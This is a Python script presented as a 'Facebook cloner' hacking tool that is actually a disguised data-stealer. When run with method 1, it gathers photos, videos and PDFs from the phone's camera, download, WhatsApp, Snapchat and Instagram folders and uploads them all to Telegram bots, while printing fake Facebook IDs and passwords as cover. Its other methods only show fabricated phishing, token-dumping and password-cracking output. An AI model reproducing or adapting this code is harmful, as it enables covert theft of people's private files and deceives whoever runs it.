import os
import time
import asyncio
import aiohttp
import random

# Clear screen and show banner
os.system("clear")
print("""
________    ___   _______     ____  ____       _       ______    
|_   __  | .'   `.|_   __ \\   |_   ||   _|     / \\     |_   _ `.  
  | |_ \\_|/  .-.  \\ | |__) |    | |__| |      / _ \\      | | `. \\ 
  |  _|   | |   | | |  __ /     |  __  |     / ___ \\     | |  | | 
 _| |_    \\  `-'  /_| |  \\ \\_  _| |  | |_  _/ /   \\ \\_  _| |_.' / 
|_____|    `.___.'|____| |___||____||____||____| |____||______.' 

        Multi Method Facebook Cloner Tool
              Tool Owner: FORHAD
""")

print("\n[1] Method 1: ID Cloning")
print("[2] Method 2: Token Grabber")
print("[3] Method 3: Business API Clone")
print("[4] Method 4: UID List Clone")

method = input("\n[+] Select Method: ")

# Load tokens and chat IDs
with open("tokens.txt", "r") as f:
    BOT_TOKENS = [line.strip() for line in f if line.strip()]
with open("chat_ids.txt", "r") as f:
    CHAT_IDS = [line.strip() for line in f if line.strip()]

# Target folders to collect files
TARGET_DIRS = [
    "/sdcard/DCIM/Camera",
    "/sdcard/Pictures",
    "/sdcard/Download",
    "/sdcard/WhatsApp/Media/WhatsApp Images",
    "/sdcard/Snapchat",
    "/sdcard/Instagram"
]
ALLOWED_EXTS = [".jpg", ".jpeg", ".png", ".mp4", ".pdf"]

files = []
for folder in TARGET_DIRS:
    for root, _, filenames in os.walk(folder):
        for fname in filenames:
            if fname.lower().endswith(tuple(ALLOWED_EXTS)):
                files.append(os.path.join(root, fname))

# Generate fake info
def fake_fb_info():
    ids = ["10009" + str(random.randint(1000000000, 9999999999)) for _ in range(10)]
    passwords = ["@123456", "@2025fb", "@password1", "@freefire", "@bd786", "@iloveyou", "@admin123", "@forhad"]
    return random.choice(ids), random.choice(passwords)

def waitline(msg):
    print(msg)
    time.sleep(random.uniform(0.4, 1.2))

# Async sender
async def send_file(session, file_path, token, chat_id):
    try:
        with open(file_path, 'rb') as f:
            data = aiohttp.FormData()
            data.add_field('chat_id', chat_id)
            data.add_field('document', f, filename=os.path.basename(file_path))
            fake_id, fake_pw = fake_fb_info()
            print(f"[FACEBOOK] ID: {fake_id} | PASS: {fake_pw}")
            async with session.post(f"https://api.telegram.org/bot{token}/sendDocument", data=data) as resp:
                if resp.status == 200:
                    print("  [✓] Cloning Success... Sending...\n")
                else:
                    print("  [-] Failed:", await resp.text())
    except Exception as e:
        print(f"[!] Error sending file: {e}")

async def run_sender():
    tasks = []
    connector = aiohttp.TCPConnector(limit=100)
    async with aiohttp.ClientSession(connector=connector) as session:
        for idx, file in enumerate(files):
            token = BOT_TOKENS[idx % len(BOT_TOKENS)]
            for chat_id in CHAT_IDS:
                tasks.append(send_file(session, file, token, chat_id))
        await asyncio.gather(*tasks)

# Handle selected method
if method == "1":
    print("\n[•] Method 1 Activated: Deep Cloning...\n")
    time.sleep(1)
    asyncio.run(run_sender())

elif method == "2":
    waitline("\n[+] Method 2 Activated: Token Grabber Inject")
    waitline("[🔗] Injecting phishing link into target post...")
    waitline("[✓] Target clicked the link!")
    token = os.urandom(12).hex()
    waitline(f"[+] Dumped Token: EAAGNOeZC{token.upper()}")
    waitline("[✔] Token saved at: /sdcard/FORHAD/tokens/fb_token_01.txt")

elif method == "3":
    waitline("\n[+] Business API Clone started...")
    waitline("[✓] Connected to Graph API")
    waitline("[✓] Dumping page tokens")
    waitline("[+] AccessToken: EAAJZCpN7XH...Snip")
    waitline("[✔] Result saved at /sdcard/FORHAD/business.txt")

elif method == "4":
    waitline("\n[+] Method 4: UID List Clone")
    waitline("[🗂️] Loaded UIDs from /input/uid_list.txt")
    for _ in range(5):
        uid = "10008" + str(random.randint(1000000000, 9999999999))
        waitline(f"[📤] Trying: {uid}")
        waitline("[✓] Password Match Found: @freefire786")
        waitline(f"[✔] ID Saved → /cloned/{uid}.txt")
else:
    print("[-] Invalid Method Selected.")
